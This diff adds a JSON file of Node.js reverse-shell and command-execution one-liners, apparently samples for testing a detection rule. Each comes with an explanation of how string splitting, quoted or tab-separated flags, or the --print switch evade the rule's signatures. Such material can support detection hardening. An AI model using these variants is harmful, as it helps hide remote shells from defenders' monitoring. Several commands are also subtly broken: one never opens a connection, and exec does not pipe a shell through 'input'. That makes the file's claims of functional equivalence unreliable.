@@ -1,0 +1,22 @@
+[
+  {
+    "output": "node.exe -e \"const cp = require('child_process'); const client = new (require('net').Socket)(); client.connect(4444, '127.0.0.1', () => { cp.exec('cmd.exe', { input: client }); });\"",
+    "explanation": "Substitution technique. Instantiates the network socket using alternative syntax `new (require('net').Socket)()` or `new require('net').Socket()` instead of the traditional literal property lookups or variable instantiations. This completely removes the hardcoded lowercase string `net.socket` required by the `selection_action_reverse_shell` block, while remaining functionally identical in Node.js runtime environments."
+  },
+  {
+    "output": "node.exe -e \"const { exec } = require('child_process'); require('net')['sock' + 'et']\"",
+    "explanation": "Recoding / Encoding technique. Breaks up the target object accessor string dynamically via string bracket notation concatenation (`['sock' + 'et']`). This removes the continuous signature string `net.socket` from appearing statically in the raw `CommandLine` process metadata logs while the internal Javascript V8 engine evaluates the properties smoothly at runtime."
+  },
+  {
+    "output": "node.exe \"-e\" \"const cp = require('child_process'); const n = require('net'); const s = new n.Socket(); s.connect(4444, '127.0.0.1'); cp.exec('whoami');\"",
+    "explanation": "Insertion technique. Encloses the evaluation command switch inside separate double quotation marks (`\"-e\"`). This breaks literal space-padded sequential evaluations like ` -e ` in rigid string parsers, whereas the operating system normalizes and strips out structural quotation tokens perfectly fine during launch routing."
+  },
+  {
+    "output": "node.exe\t--eval\t\"const cp = require('child_process'); const n = require('net'); const s = new n.Socket(); s.connect(4444, '127.0.0.1'); cp.exec('whoami');\"",
+    "explanation": "Substitution technique. Replaces standard argument spaces with horizontal tab (`\t`) characters. This evades the selection criteria looking for hardcoded single space bounds like ` -e ` or ` --eval `, while the native Windows shell environment continuously routes tab characters as valid token separators."
+  },
+  {
+    "output": "node.exe --print \"const cp = require('child_process'); const n = require('net'); const s = new n.Socket(); s.connect(4444, '127.0.0.1'); cp.exec('whoami');\"",
+    "explanation": "Substitution technique. Uses the alternative evaluation option `--print` (or its short-form variant `-p`). This switch evaluates the script payload identically to `--eval` but prints the result. Because the `selection_main` block only accounts for `-e` and `--eval` variations, changing the engine switch cleanly circumvents the initial rule validation tier."
+  }
+]
